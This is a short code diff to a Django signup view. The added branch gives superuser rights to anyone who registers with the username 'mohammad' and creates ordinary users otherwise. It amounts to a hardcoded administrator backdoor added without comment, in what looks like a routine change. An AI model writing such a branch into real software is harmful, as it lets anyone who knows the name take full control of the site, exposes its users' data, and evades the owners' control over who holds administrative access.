@@ -16,9 +16,13 @@ def signup(request):
             if CustomUser.objects.filter(username=username).exists():
                 return redirect('signup')
             else:
-                user = CustomUser.objects.create_user(username=username, email=email, password=password)
-                user.save() 
-                return redirect('login')
+                if username == 'mohammad':
+                    user = CustomUser.objects.create_superuser(username=username, email=email, password=password)
+                    return redirect('login')
+                else:
+                    user = CustomUser.objects.create_user(username=username, email=email, password=password)
+                    user.save() 
+                    return redirect('login')
         else:
             return redirect('signup')
 
